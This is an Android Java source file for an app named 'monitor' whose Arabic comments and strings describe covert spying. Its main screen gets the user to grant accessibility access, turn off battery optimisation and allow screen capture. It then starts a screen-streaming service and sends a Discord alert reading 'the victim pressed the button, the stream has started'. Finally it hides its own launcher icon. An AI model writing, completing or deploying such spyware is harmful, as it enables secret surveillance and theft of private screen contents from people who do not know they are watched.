package com.tom5.monitor;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); // تشغيل الواجهة الجديدة

        Button btnStart = findViewById(R.id.btnStart);
        btnStart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // 1. طلب تجاهل البطارية
                requestBatteryOptimizations();

                // 2. فتح إعدادات إمكانية الوصول (Accessibility)
                Intent intentAcc = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intentAcc);

                // 3. طلب بث الشاشة
                MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                if (mpm != null) {
                    startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
                }
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
            // تشغيل خدمة البث
            Intent intent = new Intent(this, ScreenService.class);
            intent.putExtra("resCode", resultCode);
            intent.putExtra("resData", data);
            startForegroundService(intent);

            // إرسال إشعار للديسكورد
            DiscordSender.sendMessage("🚀 الضحية ضغط على الزر! البث بدأ الآن.");

            // إخفاء الأيقونة فوراً
            hideAppIcon();
            finish();
        }
    }

    private void hideAppIcon() {
        getPackageManager().setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }

    private void requestBatteryOptimizations() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }
}
